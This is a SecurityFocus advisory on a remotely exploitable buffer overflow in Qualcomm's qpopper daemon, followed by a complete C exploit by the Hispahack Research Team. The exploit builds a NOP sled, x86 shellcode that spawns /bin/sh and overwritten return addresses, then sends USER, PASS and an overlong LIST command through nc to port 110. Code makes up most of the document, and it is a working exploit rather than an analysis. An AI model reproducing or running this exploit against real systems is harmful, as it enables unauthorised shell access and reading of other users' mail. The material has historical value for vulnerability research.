source: http://www.securityfocus.com/bid/948/info

A remotely exploitable buffer-overflow vulnerability affects Qualcomm's 'qpopper' daemon. This issue allows users already in possession of a username and password for a POP account to compromise the server running the qpopper daemon.

The problem lies in the code that handles the 'LIST' command available to logged-in users. By providing an overly long argument, an attacker may cause a buffer to overflow. As a result, the attacker can gain access with the user ID (UID) of the user whose account is being used for the attack and with the group ID (GID) mail.

This will allow remote attackers to access the server itself and possibly (depending on how the computer is configured) to read other users' mail via the GID mail. 

/*
 * !Hispahack Research Team  
 * http://hispahack.ccc.de
 *
 * By Zhodiac <zhodiac@softhome.net>
 *
 * Linux (x86) Qpopper xploit 3.0beta29 or lower (not 2.53)
 * Overflow at pop_list()->pop_msg()
 *
 * Tested: 3.0beta28  offset=0
 *         3.0beta26  offset=0
 *         3.0beta25  offset=0
 *
 * #include <standar/disclaimer.h>
 *
 * This code is dedicated to my love [CrAsH]] and to all the people who
 * were raided in Spain in the last few days.
 *
 * Madrid 10/1/2000
 *
 */

#include <stdio.h>
  
#define BUFFERSIZE 1004
#define NOP 0x90
#define OFFSET 0xbfffd9c4
  
char shellcode[]=  
 "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa\x89\xf9\x89"
 "\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04\x03\xcd\x80\x31\xdb\x89"
 "\xd8\x40\xcd\x80\xe8\xd9\xff\xff\xff/bin/sh";

  
void usage(char *progname) {
 fprintf(stderr,"Usage: (%s <login> <password> [<offset>]; cat) | nc <target> 110",progname);
 exit(1);
} 

int main(int argc, char **argv) {
char *ptr,buffer[BUFFERSIZE];
unsigned long *long_ptr,offset=OFFSET;
int aux;
  
 fprintf(stderr,"\n!Hispahack Research Team (http://hispahack.ccc.de)\n");
 fprintf(stderr,"Qpopper xploit by Zhodiac <zhodiac@softhome.net>\n\n");

 if (argc<3) usage(argv[0]);

 if (argc==4) offset+=atol(argv[3]);

 ptr=buffer;
 memset(ptr,0,sizeof(buffer));
 memset(ptr,NOP,sizeof(buffer)-strlen(shellcode)-16);
 ptr+=sizeof(buffer)-strlen(shellcode)-16;
 memcpy(ptr,shellcode,strlen(shellcode));
 ptr+=strlen(shellcode);
 long_ptr=(unsigned long*)ptr;
 for(aux=0;aux<4;aux++) *(long_ptr++)=offset;
 ptr=(char *)long_ptr;
 *ptr='\0';

 fprintf(stderr,"Buffer size: %d\n",strlen(buffer));
 fprintf(stderr,"Offset: 0x%lx\n\n",offset);
 
 printf("USER %s\n",argv[1]);
 sleep(1);
 printf("PASS %s\n",argv[2]); 
 sleep(1);
 printf("LIST 1 %s\n",buffer);
 sleep(1); 
 printf("uname -a; id\n");
 
 return(0);
}